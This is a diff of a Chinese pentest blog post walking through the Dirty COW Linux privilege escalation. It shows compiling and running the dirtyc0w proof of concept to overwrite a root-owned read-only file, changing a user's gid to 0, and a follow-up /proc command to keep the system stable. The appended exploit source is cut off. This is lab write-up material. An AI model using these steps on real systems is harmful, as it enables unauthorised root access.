@@ -9,9 +9,8 @@ topics = ["Pentest"]
 +++
 
 ### 0x00 测试环境
-> 我是在本地虚拟机测试的，个人理解这个漏洞的话可以起到的作用是：一个普通用户可以覆盖一个root用户的只读文件，若理解有误则希望大家提意见
-
-> ```
+我是在本地虚拟机测试的，个人理解这个漏洞的话可以起到的作用是：一个普通用户可以覆盖一个root用户的只读文件，若理解有误则希望大家提意见
+```
 CentOS release 6.5
 [reber123@WYB ~]$ uname -a
 Linux WYB 3.10.5-3.el6.x86_64 #1 SMP Tue Aug 20 14:10:49 UTC 2013 x86_64 x86_64 x86_64 GNU/Linux
@@ -20,7 +19,7 @@ uid=502(reber123) gid=502(reber123) groups=502(reber123)
 ```
 
 ### 0x01 创建文件
-> 查看文件权限信息，可以看到属主为root，且只读，权限为0404
+查看文件权限信息，可以看到属主为root，且只读，权限为0404
 ```
 [reber123@WYB ~]$ ls -al test
 -r-----r-- 1 root root 19 Oct 21 00:02 test
@@ -30,7 +29,7 @@ this is not a test
 ```
 
 ### 0x02 编译、执行poc
-> POC保存为a.c，编译为aaa
+POC保存为a.c，编译为aaa
 ```
 [reber123@WYB ~]$ gcc -lpthread a.c -o aaa
 [reber123@WYB ~]$ ls
@@ -48,18 +47,16 @@ xxxxxxxxxxx a test
 ```
 
 ### 0x03 后续利用
-> 更改用户gid为0即可
-{{% fluid_img src="/img/post/dirty_cow1.png" alt="脏牛1" %}}
-<br /><br />
-{{% fluid_img src="/img/post/dirty_cow2.png" alt="脏牛2" %}}
+更改用户gid为0即可
+![脏牛1](/img/post/dirty_cow1.png)
+![脏牛2](/img/post/dirty_cow2.png)
 ```
 提权后执行下：echo 0 > /proc/sys/vm/dirty_writeback_centisecs 
 用来关闭pdflush刷新,否则提权后过几秒系统就会卡死
 ```
 
-
 ### 0x04 附poc
-> ```
+```
 /*
 ####################### dirtyc0w.c #######################
 $ sudo -s
